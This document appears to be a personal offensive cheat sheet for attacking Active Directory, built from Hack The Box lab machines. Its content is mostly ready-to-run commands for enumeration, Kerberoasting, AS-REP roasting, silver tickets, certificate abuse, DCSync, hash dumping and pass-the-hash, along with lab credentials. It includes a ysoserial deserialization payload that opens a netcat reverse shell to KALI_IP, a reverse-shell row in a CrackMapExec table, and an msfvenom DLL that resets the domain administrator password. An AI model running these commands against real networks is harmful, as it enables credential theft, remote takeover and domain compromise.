# Basic Enumeration

#Enum4linux to scan basic info

🕵
``` 
enum4linux IP 
```

###### #SMB enumeration

List shares
``` 
smbclient -L //IP
```

Enter share
``` 
smbclient //IP/Share -U user
```

Impacket

``` 
impacket-smbclient -k scrm.local/ksimpson:ksimpson@DC1.scrm.local
```
> [!abstract] 
>-k`: Use Kerberos authentication
>- scrm.local/ksimpson:ksimpson`: Domain and credentials
>   
>- @DC1.scrm.local`: Target FQDN 

---

###### #LDAP enumeration

#LDAPSearch to find all Kerberoastable accounts

🕵
``` 
ldapsearch -x -H ldap://10.129.95.210 -D '' -w '' -b "DC=domain,DC=local" | grep -iE '^sAMAccountName:'
```

🔑
``` 
ldapsearch -x -H ldap://10.129.64.167 -D 'svc_account@domain.local' -w 'password' -b 'DC=domain,DC=htb' -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
```

``` 
ldapsearch -x -H ldap://10.129.206.155 -D "ant.edwards@PUPPY.HTB" -w 'Antman2025!' -b "DC=puppy,DC=htb" "(sAMAccountName=ADAM.SILVER)" distinguishedName userAccountControl
```

or :

``` 
ldapsearch -x -H ldap://10.129.41.200 \
  -D 'p.agila@fluffy.htb' \
  -w 'prometheusx-303' \
  -b "DC=fluffy,DC=htb" \
  | grep -iE '^sAMAccountName:'
```


> [!warning] 
> if required TLS/SSL : 

Users
``` 
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://10.129.214.147 -D 'ksimpson@scrm.local' -w 'ksimpson' -b "DC=scrm,DC=local" | grep -i '^sAMAccountName:'
```

Domain SID
``` 
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://dc1.scrm.local \
    -D "ksimpson@scrm.local" \
    -w 'ksimpson' \
    -b "DC=scrm,DC=local" \
    "(objectClass=domain)" objectSid
```

> [!success] 
> Best practice is to use kinit with /etc/krb5.conf
> 

``` 
[libdefaults]
default_realm = SCRM.LOCAL
[realms]
SCRM.LOCAL = {
kdc = dc1.scrm.local
}
[domain_realm]
.scrm.local = SCRM.LOCAL
```

*vim cmd SCRM.LOCAL to NEW.LOCAL :*
``` 
:%s/SCRM.LOCAL/NEW.LOCAL/
```

> [!attention] 
> If you need to use another ticket later (TGS) you need to perform a kdestroy
> 

``` 
kdestroy
kinit MiscSvc@SCRM.LOCAL
```

#LDIF file

> [!info] 
> dn: CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb
changetype: modify
add: member
member: CN=Alfred,CN=Users,DC=tombwatcher,DC=htb

Then execute :

``` 
ldapmodify -x -H ldap://10.129.206.155 -D "ant.edwards@PUPPY.HTB" -w 'Antman2025!' -f ../../../../Puppy/enable.ldif
```

> [!done] 
> 

#WindapSearch enumerate all accounts 

🕵
``` 
./windapsearch.py -d htb.local --dc-ip 10.129.95.210 -U
```

``` 
./windapsearch.py -d htb.local --dc-ip 10.129.95.210 --custom "objectClass=*"
```

``` 
./windapsearch.py -d htb.local --dc-ip 10.129.95.210 -s "Exchange Windows Permissions" -U --full
```

 #Bloodhound-python Obtains exploitable files for bloodhounding

🔑
``` 
sudo bloodhound-python -u 'user' -p 'password' -ns IP -d domain -c all
```

###### Bloodhound & Docker
Launch the yaml file a first time and then when you restart the docker in the future, replace :

> [!missing] 
> bhe_recreate_default_admin=${bhe_recreate_default_admin:-**false**}


by 

> [!check] 
> bhe_recreate_default_admin=${bhe_recreate_default_admin:-**true**}
> 

###### #Bruteforce

#kerbrute

``` 
./kerbrute bruteuser -d scrm.local /usr/share/wordlists/rockyou.txt ksimpson --dc 10.129.214.147
```
---

###### #AS-REP-Roasting to obtain TGT response & hashes

#GetNPUsers extract TGTs (Kerberos Ticket Granting Tickets) 
for users who do not require pre-authentication (allowing password cracking afterward) #AS-REP-Roasting 

🔓
``` 
impacket-GetNPUsers 'HTB.LOCAL/' -dc-ip 10.129.95.210 -usersfile users.txt -format hashcat
```

#GetUserSPNs 
Enumerate SPN users (Kerberoastable) - add -request argument to get hash
#impacket-addcomputer 
allow to add a computer user with high privileges
#impacket-rbcd 
configure the target object so that the attacker-controlled computer can delegate to it (**Resource-Based Constrained Delegation**)

---

###### #SPN checking

``` 
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip 10.129.214.147 -dc-host dc1.scrm.local -k -request
```


---
###### #SilverTicketAttack

> [!info] 
> - It's a forged **Service Ticket (TGS)**, signed with the **service account’s NTLM hash**.
> - Allows you to access a specific service (like MSSQL) impersonating the user.
> - Requires the **service account’s password hash** (which you have).
> - Does **NOT** require the krbtgt account hash (unlike Golden Ticket).
> - Useful when you have a service account but want to escalate inside the domain. 

#impacket-ticketer

We need Domain SID, NTLM hash of sqlsvc and the

``` 
impacket-ticketer -spn "MSSQLSvc/dc1.scrm.local" -user "ksimpson" -password "ksimpson" -nthash "B999A16500B87D17EC7F2E2A68778F05" -domain scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -dc-ip dc1.scrm.local Administrator
```

---

###### #impacket-crackmapexec 
options : #smb #ldap #ftp #winrm

| Purpose                         | Command (example)                                                   | Description                                    |
| ------------------------------- | ------------------------------------------------------------------- | ---------------------------------------------- |
| ✅ Validate Credentials          | `cme smb 10.0.0.0/24 -u user -p pass`                               | Test login on SMB across subnet                |
| 🔍 Enumerate SMB shares         | `cme smb 10.0.0.5 -u user -p pass --shares`                         | List SMB shares                                |
| 🧑‍🤝‍🧑 Enumerate Domain Users | `cme smb 10.0.0.5 -u user -p pass --users`                          | Get domain users                               |
| 📁 Get GPP passwords            | `cme smb 10.0.0.5 -u user -p pass --gpp-passwords`                  | Look for Group Policy Preference stored creds  |
| 🧠 Dump LSASS                   | `cme smb 10.0.0.5 -u user -p pass -M lsassy`                        | Dump credentials from LSASS using `lsassy`     |
| 🪟 Execute commands             | `cme smb 10.0.0.5 -u user -p pass -x "ipconfig"`                    | Run shell command on remote host               |
| 🧾 Password spraying            | `cme smb 10.0.0.0/24 -u users.txt -p "Winter2024"`                  | Test one password across many users            |
| 🔐 Pass-the-Hash                | `cme smb 10.0.0.5 -u user -H aad3b435b51404eeaad3b435b51404ee:hash` | Authenticate with NTLM hash                    |
| 🎛️ WinRM access                | `cme winrm 10.0.0.5 -u user -p pass`                                | Remote command execution via WinRM             |
| 🧬 LDAP enumeration             | `cme ldap 10.0.0.5 -u user -p pass`                                 | Pull LDAP data (e.g., user list, groups, etc.) |
| 🐚 Get reverse shell            | `cme smb 10.0.0.5 -u user -p pass -x "powershell -nop -c IEX(...)"` | Trigger reverse shell payload                  |
> [!tip] 
> ###### #NetExec  is the new #CrackMapExec 

1. **Basic LDAP Enumeration**

``` 
netexec ldap 10.129.70.145 -u emily -p 'Password123!' -d administrator.htb --users
```

 2. **List Groups**

``` 
netexec ldap 10.129.70.145 -u emily -p 'Password123!' -d administrator.htb --groups
```

3. **Kerberoast (Find SPNs and Request Tickets)**

``` 
netexec ldap 10.129.70.145 -u emily -p 'Password123!' --kerberoast
```

 4. **Password Spraying**

``` 
netexec smb 10.129.70.0/24 -u users.txt -p 'Summer2024!'
```

 5. **Execute a Command on a Host (Lateral Movement)**

``` 
netexec smb 10.129.70.150 -u emily -p 'Password123!' -x 'whoami'
```

 5. **Dump SMB Shares**

``` 
netexec smb 10.129.70.145 -u emily -p 'Password123!' --shares
```

7. **Check for Local Admin Access**

``` 
netexec smb 10.129.70.150 -u emily -p 'Password123!' --local-admin-check
```

 8. **WinRM Command Execution**

``` 
netexec winrm 10.129.70.150 -u emily -p 'Password123!' -x 'ipconfig /all'
```

---

``` 
netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149

```

###### Details
- `netexec smb 192.168.138.137`  
    Targets the SMB service on the host at **192.168.138.137**.
- `-d marvel.local`  
    Specifies the domain name as **marvel.local**.
- `-u fcastle`  
    Uses the username **fcastle**.
- `-p Password1`  
    Authenticates with password **Password1**.
- `-M slinky`  
    Loads and runs the **`slinky`** module.  
    _(Assuming `slinky` is a specific NetExec module or custom module for lateral movement or execution.)_
- `-o NAME=test SERVER=192.168.138.149`  
    Passes options (`-o`) to the module with parameters:
    - `NAME=test`
    - `SERVER=192.168.138.149

###### #kerbrute 

``` 
./kerbrute passwordspray -d megabank.local --dc 10.129.96.155 /home/kali/Resolute/users.txt Welcome123!
```

or

``` 
./kerbrute passwordspray -d megabank.local --dc 10.129.96.155 users.txt pass.txt
```


---
# Exploitation

> [!info] 
> Linux
> 

**(Permission Abuse) Add member**
``` 
net rpc group addmem "DEVELOPERS" "levi.james" -U "PUPPY.HTB"/"levi.james"%'KingofAkron2025!' -S "PUPPY.HTB"
```

**(Permission Abuse) Change password**
``` 
net rpc password "adam.silver" -U "PUPPY.HTB"/"levi.james"%'KingofAkron2025!' -S "DC.PUPPY.HTB"
```

---
## PowerShell

#Windows #Powershell 

| Purpose          | Command                                                     |
| ---------------- | ----------------------------------------------------------- |
| Who am I         | `whoami` or `$env:USERNAME`                                 |
| Get user SID     | `whoami /user`                                              |
| List local users | `Get-LocalUser` _(≥ Win10)_ or `net user`                   |
| Group membership | `whoami /groups`                                            |
| Logged-in users  | `query user` or `Get-WmiObject -Class Win32_ComputerSystem` |
| Environment vars | `Get-ChildItem Env:`                                        |

| Purpose            | Command                  |
| ------------------ | ------------------------ |
| IP config          | `ipconfig /all`          |
| Network interfaces | `Get-NetIPConfiguration` |
| Routing table      | `route print`            |
| Open connections   | `netstat -ano`           |
| DNS cache          | `ipconfig /displaydns`   |
| Firewall status    | `Get-NetFirewallProfile` |
| ARP table          | `arp -a`                 |

| Purpose                      | Command                                                                 |
| ---------------------------- | ----------------------------------------------------------------------- |
| Domain name                  | `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()` |
| Hostname                     | `hostname`                                                              |
| AD domain controller         | `nltest /dclist:<domain>`                                               |
| Trust relationships          | `nltest /domain_trusts`                                                 |
| AD user list _(if allowed)_  | `net user /domain`                                                      |
| AD group list _(if allowed)_ | `net group /domain`                                                     |

| Purpose            | Command                              |
| ------------------ | ------------------------------------ |
| List drives        | `Get-PSDrive -PSProvider FileSystem` |
| List folders/files | `Get-ChildItem -Recurse -Force`      |
| Hidden files       | `dir -Force`                         |
| File contents      | `Get-Content .\file.txt`             |
| Recent files       | `dir $env:USERPROFILE -Recurse       |

| Purpose                    | Command                                                                           |
| -------------------------- | --------------------------------------------------------------------------------- |
| Search files for passwords | `Select-String -Path *.txt -Pattern "password"`                                   |
| Browser credentials        | Access limited, but can look for user-level files                                 |
| Wi-Fi creds                | `netsh wlan show profiles` (then `netsh wlan show profile name="SSID" key=clear`) |

|Purpose|Command|
|---|---|
|System info|`systeminfo`|
|OS version|`[System.Environment]::OSVersion`|
|Architecture|`$env:PROCESSOR_ARCHITECTURE`|
|Uptime|`(Get-CimInstance Win32_OperatingSystem).LastBootUpTime`|
|AV product|`Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct`|
|Local admins|`net localgroup administrators` _(May fail on low priv)_|

> [!note] 
> Even as a **low-privileged user**, you can prep for privilege escalation:
> - Search for **misconfigured services**
> - Look for **write access to folders in PATH**
> - Check if you're in any **unexpected privileged groups**
> - Check **alwaysInstallElevated** policy:  
> - `reg query HKCU\Software\Policies\Microsoft\Windows\Installer`  
> - `reg query HKLM\Software\Policies\Microsoft\Windows\Installer` 

#AD #Powershell 

| Targets / Purpose                | Example Usage                                                                                                                            |
| -------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| Fetch AD user accounts           | `Get-ADUser -Filter *`                                                                                                                   |
| List AD groups                   | `Get-ADGroup -Filter *`                                                                                                                  |
| List computers in AD             | `Get-ADComputer -Filter *`                                                                                                               |
| List OUs                         | `Get-ADOrganizationalUnit -Filter *`                                                                                                     |
| List members of a group          | `Get-ADGroupMember "Domain Admins"`                                                                                                      |
| Groups for a user/computer       | `Get-ADPrincipalGroupMembership jdoe`                                                                                                    |
| Generic search for any AD object | `Get-ADObject -LDAPFilter "(objectClass=*)"`                                                                                             |
| Info about current domain        | `Get-ADDomain`                                                                                                                           |
| List domain controllers          | `Get-ADDomainController -Filter *`                                                                                                       |
| Info about forest structure      | `Get-ADForest`                                                                                                                           |
| Password policies                | `Get-ADFineGrainedPasswordPolicy -Filter *`                                                                                              |
| AD replication topology          | `Get-ADReplicationSite -Filter *`                                                                                                        |
| Managed service accounts         | `Get-ADServiceAccount -Filter *`                                                                                                         |
| Domain trust relationships       | `Get-ADTrust`                                                                                                                            |
| User’s effective password policy | `Get-ADUserResultantPasswordPolicy jdoe`                                                                                                 |
|                                  | Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName \| Select SamAccountName,ServicePrincipalName<br> |
Example :

``` 
whoami /groups
```

``` 
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```



---
## Abuse (Linux Latmov)

#AddSelf abuse

1. Add yourself

``` 
net rpc group addmem "INFRASTRUCTURE" "alfred" -U "TOMBWATCHER"/"alfred"%'basketball' -S "TOMBWATCHER.HTB"
```

2. Verify that you are in :

``` 
net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```


#GenericAll  or #GenericWrite abuse

If #ADCS Activate Directory Certificate Services vulnerability :

``` 
certutil -template
```

or show one specific template name information :

``` 
certutil -template | Select-String -Pattern "We
bServer" -Context 0,14
```


🔑 #certipy 

``` 
certipy-ad find -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56
``` 

``` 
certipy req -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -ca 'sequel-dc-ca' -template 'UserAuthentication' -target sequel.htb -upn administrator@sequel.htb
```

If #ESC1 vulnerability : 

> [!question] 
> Conditions :
> - Machineaccount quota is more than 2
> - One certificate allows all domain computers to enrol 

``` 
impacket-addcomputer 'authority.htb/svc_ldap' -method LDAPS -computer-name 'INSIDER01$' -computer-pass 'Summer2018!' -dc-ip 10.129.229.56
```

Next, we use this computer account to request a certificate specifying the built-in domain
Administrator account as the SAN

``` 
certipy-ad auth -pfx administrator_authority.pfx -debug
```

> [!fail] 
> Sometimes it can fail due to the fact the DC doesn't not support PKINIT 
###### 🔍 So, is Pass-the-Cert possible?

To determine that, answer these:

1. ✅ Do you have a valid **client authentication certificate** (with `UPN` in SAN)?
2. ✅ Is **PKINIT enabled** on the DC? (Windows Server 2016+ typically has it.)
3. ✅ Can the DC resolve the `UPN` you're sending (like `administrator@authority.htb`)?
4. ✅ Is time synced and port 88 open between you and the DC?

If all yes: **Pass-the-Cert should work**.

###### Export keys with #Openssl

``` 
openssl pkcs12 -in administrator_authority.pfx -nocerts -out administrator.key
```

``` 
openssl pkcs12 -in administrator_authority.pfx -clcerts -nokeys -out administrator.crt
```

or

``` 
openssl pkcs12 -in administrator_authority.pfx -nokeys -out administrator.crt
```

#Pass-the-cert

> [!note] 
> Use PassTheCert Github repo script 

``` 
python3 ../tools/PassTheCert/Python/passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'INSIDER01$'
```

#impacket-getST 

> [!note] 
> Impersonate the Administrator account and grab a TGT 

> [!important] 
> Requires : sudo ntpdate 10.129.229.56
> 

``` 
impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator
'authority.htb/INSIDER01$:SuperPassword!'
```

> [!hint] 
> Declare **KRB5CCNAME** variable following the creating of the ccache file 

``` 
export KRB5CCNAME=Name-of-the-file.ccache
```

#impacket-getTGT 

> [!note] 
> Get TGT ticket from a svc service running
> 

``` 
impacket-getTGT scrm.loca/Miscsvc:ScrambledEggs9900
```

or :

``` 
impacket-getTGT -aesKey 499620251908efbd6972fd63ba7e385eb4ea2f0ea5127f0ab4ae3fd7811e600a tombwatcher.htb/ansible_dev$ -dc-ip 10.129.203.235
```


> [!tip] 
> Export KRB5CCNAME variable 

``` 
evil-winrm -i dc1.scrm.local -r SCRM.LOCAL
```

#SecretDumps 

*see below*

---
## PowerView (Win LatMov)

#PowerView-ps to enumerate AD system 

[PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1)

``` 
powershell -ep bypass
```

``` 
Import-Module . .\PowerView.ps1
```

``` 
Get-DomainGroupMember "GroupName"
```

If Permissions #GenericAll  or #GenericWrite :

``` 
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```

``` 
Set-DomainUserPassword -Identity 'account@domain.htb' -AccountPassword $NewPassword
```

#Get-ADObject 

> [!note] 
> - To retrieve **non-user** or **non-group** AD objects like **organizational units (OUs)**, **service connection points**, **computer accounts**, etc.
> - To **fetch specific attributes** that other cmdlets like `Get-ADUser` or `Get-ADGroup` don’t return by default.
> - To enumerate **unusual or hidden properties**, such as:
> - `msDS-AllowedToDelegateTo` (used in delegation attacks)
> - `msDS-ManagedPassword` (from gMSA accounts)
> - `ms-DS-MachineAccountQuota`
> - `adminCount` (flag for protected groups) 

``` 
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
```

#Get-ADUser Obtain info about **users**

``` 
Get-ADUser -Identity svc_loanmgr -Properties * | Format-List
```

#Get-ADDomain Obtain info about **domain**

``` 
Get-ADDomain
```


# PrivEsc

> [!tip] 
> Granting a user **DCSync rights in Active Directory** is **very similar** to giving a user on a Linux system the ability to **read `/etc/shadow `**

#impacket-getST Request Service ticket (TGT) to impersonate admin (Kerberos .ccache file)

#pyWhisker to Add Kerberos Shadow Credentials

``` 
pywhisker add -u attacker@domain.com -p 'Password123!' -t victimuser -k shadow.key
```

#Rubeus authenticate using the key and the cert file

``` 
Rubeus asktgt /user:victimuser /certificate:shadow.crt
```

###### #BinaryFormatter & #Serialization

![[Pasted image 20250625183138.png]]
1. From windows machine, download ysoserial.exe
2. Execute this :
``` 
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c
"C:\users\miscsvc\music\nc64.exe -e powershell KALI_IP 9001"
```
4. Copy base64 lines
5. Execute it using the order + base64 code with :
``` 
nc ip 4411
```
###### #targetedKerberoast
Performs an LDAP search to find user accounts with a Service Principal Name (SPN), request a TGS and then dump all the SPN accounts hash

#DCsync attack (Rendre un compte Kerberoastable)

``` 
./targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'Password123!' --dc-ip 10.129.70.145
```

#BloodyAD



###### #impacket-dacledit with creds, domain, OU, and WriteDACL perm over a DC, you can DCSync and dump hashes

``` 
impacket-dacledit -action write \
  -rights DCSync \
  -target-dn 'CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local' \
  -principal svc-alfresco \
  htb.local/svc-alfresco:s3rvice
```

###### #SecretDumps allow a high-privileged user to dump admin hashes

``` 
impacket-secretsdump dom.htb/svc:'Moneymakestheworldgoround!'@10.129.225.17
```

``` 
impacket-secretsdump -k -no-pass authority.htb/Administrator@authority.authority.htb -just-dc-ntlm
```

``` 
impacket-secretsdump -outputfile all_hashes -just-dc ADMINISTRATOR.HTB/ethan@10.129.70.145
```


| Target                      | Command Example                                               | Description                                      |
| --------------------------- | ------------------------------------------------------------- | ------------------------------------------------ |
| 🖥️ Dump local SAM hashes   | `secretsdump.py LOCAL -target-ip 10.0.0.5`                    | Run locally on compromised host                  |
| 📡 Dump remotely with creds | `secretsdump.py DOMAIN/user:password@10.0.0.5`                | Dump SAM/LSASS over SMB                          |
| 🔑 Use NTLM hash            | `secretsdump.py DOMAIN/user@10.0.0.5 -hashes <LM>:<NT>`       | Pass-the-hash to authenticate                    |
| 🧬 Dump NTDS from DC        | `secretsdump.py -just-dc DOMAIN/user:pass@dc.ip`              | Extract domain hashes from NTDS remotely         |
| 🧬 Just secrets from DC     | `secretsdump.py -just-dc-user 'svc-*' DOMAIN/user:pass@dc.ip` | Filtered extraction (e.g. only service accounts) |
| 💽 Offline NTDS dump        | `secretsdump.py -ntds ntds.dit -system SYSTEM`                | Extract hashes from NTDS/SYSTEM registry files   |
| 🧾 Use Kerberos (TGT)       | `secretsdump.py -k -no-pass user@10.0.0.5`                    | Use current Kerberos ticket (if available)       |
| 🪪 SAM from registry        | `secretsdump.py -sam SAM -system SYSTEM`                      | Extract from local registry hives (offline)      |
###### #DPAPI 

https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf

###### #runas 
https://www.hackingarticles.in/windows-privilege-escalation-stored-credentials-runas/

(troubleshooting with NTP)
[https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069](https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069)

> [!attention] 
> Probleme avec horloge
> 


![[Pasted image 20250526195446.png]]
Steal the encrypted blob ->
> [!attention] 
> Fulfill here 

https://www.hackingarticles.in/readgmsapassword-attack/
??
###### #psexec Log in to machine using has️h #Pass-the-hash , #Pass-the-ticket

``` 
impacket-psexec administrator@10.129.95.210 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

###### #Wmiexec Obtain a shell with admin credentials (plaintext)

``` 
impacket-wmiexec tombwatcher.htb/Alfred:'basketball'@10.129.203.235
```
###### #msfvenom 

``` 
msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll
```

###### #Azure

``` 
Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
```

Check **Get-Process** or **tasklist**

###### #LSASS dump

#pypykatz (requires to dump .dmp file)

``` 
pypykatz lsa minidump lsass.dmp
```

---
# MSSQL 

### 🧱 List all schemas in the current database

``` 
SELECT name FROM sys.schemas;
```

### 📋 List all tables in the current database

``` 
SELECT schema_name(schema_id) AS schema_name, name  FROM sys.tables;
```

### 📌 List all columns for a specific table

``` 
SELECT COLUMN_NAME, DATA_TYPE  FROM INFORMATION_SCHEMA.COLUMNS  WHERE TABLE_NAME = 'Employees';
```

### 🔍 Search for interesting table names

``` 
SELECT name  FROM sys.tables  WHERE name LIKE '%user%' OR name LIKE '%login%' OR name LIKE '%cred%' OR name LIKE '%pass%';
```

---

## 🧑‍🔐 Privilege/role enumeration

### Check your current login

``` 
SELECT SYSTEM_USER;  -- SQL login SELECT SUSER_NAME(); -- Domain or login name
```

### List your roles

``` 
EXEC sp_helpuser;
```

### See what permissions you have

``` 
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
```

---

## 🏛 System-level info

### Show MSSQL version

`SELECT @@VERSION;`

### Show instance name

`SELECT @@SERVICENAME;`

### Get current database name

`SELECT DB_NAME();`

---

## 📦 Extracting data

### Example: dump all users in a `Users` table

`SELECT * FROM Users;`

### Example: dump credentials from a common table name

`SELECT * FROM Credentials;`

---
# Persistence

Golden ticket

krtbgt hash is cracked, then game over.